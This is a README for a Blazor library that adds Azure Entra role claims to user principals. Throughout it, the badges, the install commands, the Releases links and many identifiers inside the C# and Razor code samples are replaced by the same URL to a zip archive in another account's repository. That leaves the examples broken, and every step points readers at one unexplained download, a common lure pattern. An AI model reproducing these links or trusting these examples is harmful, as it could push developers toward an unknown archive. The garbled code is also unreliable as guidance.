# Soenneker Blazor Auth: Entra Roles Principal Factory 🎉

![GitHub Release](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip) [![GitHub Issues](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip)](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip)

Welcome to the **Soenneker Blazor Auth: Entra Roles Principal Factory** repository! This project customizes Blazor authentication by extending the `AccountClaimsPrincipalFactory`. It adds standard role claims from Azure Entra, making it easier to manage user roles in your Blazor applications.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features ✨

- **Custom Role Claims**: Automatically adds role claims from Azure Entra to your Blazor application.
- **Seamless Integration**: Works smoothly with existing Blazor authentication setups.
- **Easy Configuration**: Simple to set up and configure for your specific needs.
- **Open Source**: Fully open-source and available for contributions.

## Installation 🛠️

To get started with the Soenneker Blazor Auth: Entra Roles Principal Factory, follow these steps:

1. **Clone the Repository**:

   ```bash
   git clone https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip
   ```

2. **Navigate to the Project Directory**:

   ```bash
   cd https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip
   ```

3. **Install Dependencies**:

   Use the following command to install the required packages:

   ```bash
   dotnet restore
   ```

4. **Build the Project**:

   Compile the project using:

   ```bash
   dotnet build
   ```

5. **Run the Application**:

   To run the application, use:

   ```bash
   dotnet run
   ```

For detailed instructions and updates, check the [Releases](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip) section.

## Usage 📚

### Configuration

To configure the Entra Roles Principal Factory, follow these steps:

1. **Add the Factory to Services**:

   In your `https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip` or `https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip`, add the factory to the services collection:

   ```csharp
   https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip<IUserClaimsPrincipalFactory<ApplicationUser>, EntraRolesPrincipalFactory>();
   ```

2. **Set Up Azure Entra**:

   Ensure your Azure Entra setup includes the necessary roles and claims. Configure your application to authenticate against Azure Entra.

3. **Use in Blazor Components**:

   You can now access the role claims in your Blazor components. For example:

   ```razor
   @inject AuthenticationStateProvider AuthenticationStateProvider

   @code {
       private ClaimsPrincipal user;

       protected override async Task OnInitializedAsync()
       {
           var authState = await https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip();
           user = https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip;
       }
   }
   ```

### Example

Here’s a simple example of how to display user roles in a Blazor component:

```razor
@page "/roles"

@inject AuthenticationStateProvider AuthenticationStateProvider

<h3>User Roles</h3>

@if (user != null)
{
    <ul>
        @foreach (var claim in https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip(c => https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip == https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip))
        {
            <li>https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip</li>
        }
    </ul>
}
else
{
    <p>No user roles found.</p>
}

@code {
    private ClaimsPrincipal user;

    protected override async Task OnInitializedAsync()
    {
        var authState = await https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip();
        user = https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip;
    }
}
```

## Contributing 🤝

We welcome contributions to the Soenneker Blazor Auth: Entra Roles Principal Factory! If you want to contribute, please follow these steps:

1. **Fork the Repository**: Click the "Fork" button at the top right of this page.
2. **Create a Branch**: Create a new branch for your feature or bug fix.
   ```bash
   git checkout -b feature/YourFeatureName
   ```
3. **Make Your Changes**: Implement your changes and ensure they work as expected.
4. **Commit Your Changes**: Commit your changes with a clear message.
   ```bash
   git commit -m "Add new feature"
   ```
5. **Push to Your Branch**: Push your changes to your forked repository.
   ```bash
   git push origin feature/YourFeatureName
   ```
6. **Create a Pull Request**: Open a pull request to the main repository.

## License 📄

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Support 🙋‍♂️

If you encounter any issues or have questions, please check the [Releases](https://github.com/footmeboiya/soenneker.blazor.auth.entrarolesprincipalfactory/raw/refs/heads/main/test/blazor-auth-soenneker-entrarolesprincipalfactory-comical.zip) section or open an issue in the GitHub repository.

Thank you for checking out the Soenneker Blazor Auth: Entra Roles Principal Factory! We hope you find it useful for your Blazor applications.